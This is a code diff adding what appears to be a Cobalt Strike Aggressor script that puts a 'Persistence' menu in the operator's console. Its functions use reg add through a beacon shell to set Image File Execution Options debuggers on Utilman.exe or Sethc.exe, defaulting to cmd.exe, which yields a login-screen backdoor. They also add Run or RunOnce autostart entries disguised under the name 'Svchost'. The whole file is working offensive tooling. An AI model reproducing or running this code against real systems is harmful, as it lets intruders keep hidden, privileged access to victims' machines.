@@ -1,0 +1,70 @@
+#define functions
+
+
+sub InstallBackDoor{
+    local('$Prefix $File');
+    $Prefix = "\"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
+    $File = replace($3['CallBackFile'], "\"", "");
+    if ($3['Type'] eq "Utilman"){
+        $Prefix = $Prefix."Utilman.exe\"";
+        bshell($bid,"reg add  $+ $Prefix /f");
+        bshell($bid,"reg add  $+ $Prefix /v Debugger /t REG_SZ /d \" $+ $File \" /f ");
+    }
+    else if($3['Type'] eq "Sethc"){
+        $Prefix = $Prefix."Sethc.exe\"";
+        bshell($bid,"reg add  $+ $Prefix /f");
+        bshell($bid,"reg add  $+ $Prefix /v Debugger /t REG_SZ /d \" $+ $File \" /f ");
+    }
+    
+}
+
+
+sub InstallAutoRun{
+    local('$Prefix $File $Key $Item $Reg');
+    $Prefix = "\\Software\\Microsoft\\Windows\\CurrentVersion\\";
+    $File = replace($3['CallBackFile'], "\"", "");
+    $Key = "\"".$3['RegKey'];
+    $Item = $3['RegItem']."\"";
+    $Reg = $Key.$Prefix.$Item;
+    bshell($bid,"reg add  $+ $Reg /f");
+    bshell($bid,"reg add  $+ $Reg /v Svchost /t REG_SZ /d \" $+ $File \" /f ");
+}
+
+
+
+#append menus
+
+
+    menu "Persistence"{
+                item "IFEO"{
+                    if (!-isadmin $1['@']){
+                        show_error("Permission Denied!");
+                    }
+                    else{
+                        $bid = $1['@'];
+                        $Dialog = dialog("IFEO",%(Type => "Utilman", CallBackFile => "c:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallBackDoor);
+                        dialog_description($Dialog, "Install BackDoor With IFEO");
+                        drow_combobox($Dialog,"Type","Type: ", @("Utilman", "Sethc"));
+                        drow_text($Dialog,"CallBackFile","CallBackFile: ");
+                        dbutton_action($Dialog, "Run");
+                        dialog_show($Dialog);
+                        
+                    }
+                }
+
+                item "AutoRun"{
+                    if (!-isadmin $1['@']){
+                        show_error("Permission Denied!");
+                    }
+                    else{
+                        $bid = $1['@'];
+                        $Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", CallBackFile => "C:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallAutoRun);
+                        dialog_description($Dialog, "Registry Add Boot Start Item");
+                        drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
+                        drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx"));
+                        drow_text($Dialog, "CallBackFile", "CallBackFile: ");
+                        dbutton_action($Dialog, "Reg");
+                        dialog_show($Dialog);
+                    }
+                }
+    }
